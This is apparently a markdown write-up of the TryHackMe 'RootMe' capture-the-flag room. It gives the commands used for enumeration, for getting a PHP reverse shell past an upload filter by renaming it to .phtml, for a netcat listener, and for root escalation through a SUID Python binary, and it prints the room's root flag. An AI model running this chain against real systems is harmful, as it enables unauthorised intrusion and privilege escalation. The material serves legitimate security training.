<p align="right">
  <sub>
    <b>Platform:</b> TryHackMe<br>
    <b>Difficulty:</b> Easy<br>
    <b>Status:</b> Completed ✅<br>
    <b>URL:</b> <a href="https://tryhackme.com/room/rrootme">RootMe</a><br>
    <b>Tags:</b> #tryhackme #easy #thm
  </sub>
</p>
- Bypass file extension filtering on the upload endpoint
- Escalate privileges using a SUID binary
- Retrieve `user.txt` and `root.txt`
nmap -sV 10.10.110.118
```
gobuster dir -u 10.10.110.118 -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```
- `$port` → `9001`
mv php_reverse_shell.php php_reverse_shell.phtml
```
nc -lvnp 9001
```
which python
python -c 'import pty;pty.spawn("/bin/bash")'
```
find / -type f -name user.txt 2>/dev/null
```
find / -perm -u=s -type f 2>/dev/null
```
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
|------|-------|
| Root Flag | `THM{pr1v1l3g3_3sca4l4ti0n}` |
- **SUID on interpreters is dangerous** — granting SUID to binaries like Python gives any user a trivial path to root. GTFOBins covers dozens of these cases.
- Always check for SUID binaries early in the privilege escalation phase — `find / -perm -u=s -type f 2>/dev/null` should be a standard step in any Linux enumeration.
|---|---|
| `nmap` | Port and service enumeration |
| `gobuster` | Web directory brute-forcing |
| [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP reverse shell payload |
| `netcat` | Listener for catching reverse shell |
| [GTFOBins - Python](https://gtfobins.github.io/gtfobins/python/) | SUID Python privilege escalation reference |